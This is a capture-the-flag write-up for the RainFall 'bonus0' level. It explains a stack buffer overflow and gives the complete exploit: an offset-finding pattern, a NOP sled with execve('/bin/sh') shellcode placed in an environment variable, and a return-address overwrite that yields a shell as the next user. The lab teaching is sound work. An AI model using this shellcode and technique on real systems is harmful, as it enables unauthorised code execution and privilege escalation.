##  Description

The disassembly of this binary does not show anything particularly difficult to interpret, and the source code is relatively straightforward.

The program uses multiple buffers, and the one used to get user input is particularly large (4096 bytes).

Once the user input is read, strchr() is used to find any newline character and replace it with a null terminator.

First off, we can try to overflow the buffer and see what happens:

```bash
Starting program: /home/user/bonus0/bonus0 
 - 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7    // 24 bytes, 4 bytes overflow
 - 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7    // 24 bytes, 4 bytes overflow
Aa0Aa1Aa2Aa3Aa4Aa5AaAa0Aa1Aa2Aa3Aa4Aa5Aa��� Aa0Aa1Aa2Aa3Aa4Aa5Aa���

Program received signal SIGSEGV, Segmentation fault.
0x41336141 in ?? ()
^ "Aa3A" -> offset 9
```

So the return address is located at offset 9, and it is overwritable.

It would be tempting to try and overwrite the return address with the address of system() like we did in the previous levels, but we are blocked by the strncpy() which only copies 20 bytes in p(), preventing the overflow.

One way to bypass this is to use an environment variable to store a shellcode, and redirect the execution flow to the address it's stored at.

```bash
bonus0@RainFall:~$ export shellcode=$(python -c 'print "\x90"*153 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
                                                        ^ nop sled
bonus0@RainFall:~$ (python -c 'print("A" * 20)'; python -c 'print("B" * 9 + "\xb8\xfe\xff\xbf" + "B"*7)'; cat) | ./bonus0
 - 
 - 
AAAAAAAAAAAAAAAAAAAABBBBBBBBB����BBBBBBB��� BBBBBBBBB����BBBBBBB���
whoami
bonus1
```

Note the use of a nop sled to increase the chances of hitting the shellcode, and the address of the environment variable which is located at 0xbffffeb8.

[Source for the shellcode](https://www.exploit-db.com/exploits/13628)
